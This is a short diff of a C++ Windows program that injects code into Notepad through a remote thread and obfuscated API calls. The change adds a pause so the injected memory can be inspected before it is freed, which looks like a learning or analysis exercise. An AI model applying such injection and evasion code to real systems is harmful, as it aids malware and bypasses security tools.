@@ -111,7 +111,7 @@ int main() {
     HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
 
     if (hThread) {
-        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
+        WaitForSingleObject(hThread, INFINITE);
         std::cout << "[+] Classic Code Injection with API Obfuscation Successful!" << std::endl;
         CloseHandle(hThread);
     }
@@ -119,12 +119,15 @@ int main() {
         std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
     }
 
+    // ── ĐƯA LỆNH DỪNG LÊN ĐÂY ĐỂ ĐÓNG BĂNG RAM TRƯỚC KHI GIẢI PHÓNG ──
+    std::cout << "\n[*] PAUSE: Checking memory layout inside Notepad now... Press Enter after verification." << std::endl;
+    std::cin.get();
+
     // Thu hồi vùng nhớ và đóng Handle hệ thống triệt để chống Memory Leak
     VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
     VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
     CloseHandle(hProcess);
 
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
     return EXIT_SUCCESS;
 }
+
